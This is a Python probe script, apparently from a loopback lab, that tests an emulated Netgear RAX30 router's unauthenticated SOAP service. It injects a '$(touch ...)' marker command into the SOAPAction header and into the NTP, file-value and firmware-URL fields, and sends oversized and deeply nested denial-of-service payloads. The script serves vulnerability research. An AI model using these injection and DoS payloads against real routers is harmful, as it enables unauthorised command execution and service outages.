#!/usr/bin/env python3
"""Controlled unauthenticated RCE/DoS probes for the loopback-only RAX30 lab."""

from __future__ import annotations

import os
import socket
import time


HOST = os.environ.get("FRIDAY_SOAP_HOST", "127.0.0.1")
PORT = int(os.environ.get("FRIDAY_SOAP_PORT", "25130"))
URN = "urn:NETGEAR-ROUTER:service"
MARKER = "FRIDAY_RAX30_RCE_MARKER"


def raw_request(
    action: str,
    body: str,
    timeout: float = 5,
    extra_headers: tuple[str, ...] = (),
) -> bytes:
    payload = (
        '<?xml version="1.0"?>'
        '<soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/">'
        f"<soap-env:Body>{body}</soap-env:Body></soap-env:Envelope>"
    ).encode()
    wire = (
        b"POST /soap/server_sa HTTP/1.1\r\n"
        b"Host: 10.0.2.15:5000\r\n"
        + f'SOAPAction: "{action}"\r\n'.encode()
        + b"Content-Type: text/xml\r\n"
        + f"Content-Length: {len(payload)}\r\n".encode()
        + "".join(f"{header}\r\n" for header in extra_headers).encode()
        + b"Connection: close\r\n\r\n"
        + payload
    )
    response = bytearray()
    try:
        with socket.create_connection((HOST, PORT), timeout=timeout) as client:
            client.sendall(wire)
            client.shutdown(socket.SHUT_WR)
            while True:
                chunk = client.recv(4096)
                if not chunk:
                    break
                response.extend(chunk)
    except (OSError, TimeoutError):
        return b""
    return bytes(response)


def request(action: str, body: str, timeout: float = 5) -> tuple[str, int]:
    response = raw_request(action, body, timeout)
    status = response.splitlines()[0].decode(errors="replace") if response else "no-response"
    return status, len(response)


def baseline() -> bool:
    status, _ = request(
        f"{URN}:DeviceInfo:1#GetInfo",
        f'<m:GetInfo xmlns:m="{URN}:DeviceInfo:1"/>',
    )
    return status.startswith("HTTP/1.1 200")


def main() -> int:
    marker_command = f"$(touch /tmp/{MARKER})"
    cases = [
        (
            "soapaction-command",
            f"{URN}:DeviceInfo:1#GetInfo;{marker_command}",
            f'<m:GetInfo xmlns:m="{URN}:DeviceInfo:1"/>',
        ),
        (
            "ntp-command",
            f"{URN}:DeviceConfig:1#SetNTP",
            f'<m:SetNTP xmlns:m="{URN}:DeviceConfig:1">'
            f"<NewNTPServer1>{marker_command}</NewNTPServer1></m:SetNTP>",
        ),
        (
            "file-value-command",
            f"{URN}:DeviceConfig:1#SetFileValue",
            f'<m:SetFileValue xmlns:m="{URN}:DeviceConfig:1">'
            f"<NewFileName>/tmp/x</NewFileName><NewFileValue>{marker_command}</NewFileValue>"
            "</m:SetFileValue>",
        ),
        (
            "firmware-command",
            f"{URN}:DeviceConfig:1#CheckAndDownloadNewFirmware",
            f'<m:CheckAndDownloadNewFirmware xmlns:m="{URN}:DeviceConfig:1">'
            f"<NewFirmwareURL>{marker_command}</NewFirmwareURL></m:CheckAndDownloadNewFirmware>",
        ),
        (
            "long-action-dos",
            f"{URN}:DeviceInfo:1#" + ("A" * 16_384),
            f'<m:GetInfo xmlns:m="{URN}:DeviceInfo:1"/>',
        ),
        (
            "deep-xml-dos",
            f"{URN}:DeviceInfo:1#GetInfo",
            "<x>" * 512 + "x" + "</x>" * 512,
        ),
        (
            "large-value-dos",
            f"{URN}:DeviceConfig:1#SetFileValue",
            f'<m:SetFileValue xmlns:m="{URN}:DeviceConfig:1"><NewFileValue>'
            + ("A" * 262_144)
            + "</NewFileValue></m:SetFileValue>",
        ),
    ]

    print(f"baseline_before={'pass' if baseline() else 'fail'}")
    for name, action, body in cases:
        status, size = request(action, body)
        time.sleep(0.25)
        alive = baseline()
        print(f"{name}: status={status!r} bytes={size} service_alive={str(alive).lower()}")
        if not alive:
            return 2
    print("baseline_after=pass")
    print("inspect_serial_for=FRIDAY_RAX30_RCE_SINK")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
